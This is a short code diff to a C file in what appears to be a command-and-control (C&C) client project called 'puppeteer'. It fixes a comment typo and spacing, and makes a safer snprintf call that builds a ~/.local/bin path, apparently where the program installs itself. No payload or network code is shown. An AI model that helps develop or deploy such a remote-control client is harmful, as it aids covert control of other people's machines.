@@ -2,7 +2,7 @@
 /*
  * This header file belongs to https://github.com/arthur-bryan/puppeteer
  *
- * Initialization of the comunnication with the C&C server
+ * Initialization of the communication with the C&C server
  *
  * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
  */
@@ -26,7 +26,7 @@
  */
 int
 main(int argc, char *argv[]) {
-    struct  passwd  *user;
+    struct passwd   *user;
     char            destination_path[256] = { 0 };
     char            *exec_filename;
     char            *safe_exec_filename;
@@ -38,7 +38,8 @@ main(int argc, char *argv[]) {
  
     safe_exec_filename = strdup(argv[0]);  // for safe use of basename()
     exec_filename = basename(safe_exec_filename);
-    snprintf(destination_path, strlen(user->pw_dir) + 13,
+    destination_path[sizeof destination_path - 1] = '\0';
+    snprintf(destination_path, sizeof destination_path,
              "%s/.local/bin/", user->pw_dir);
     if (!file_exists(destination_path)) {
         if (create_dir(destination_path)) {
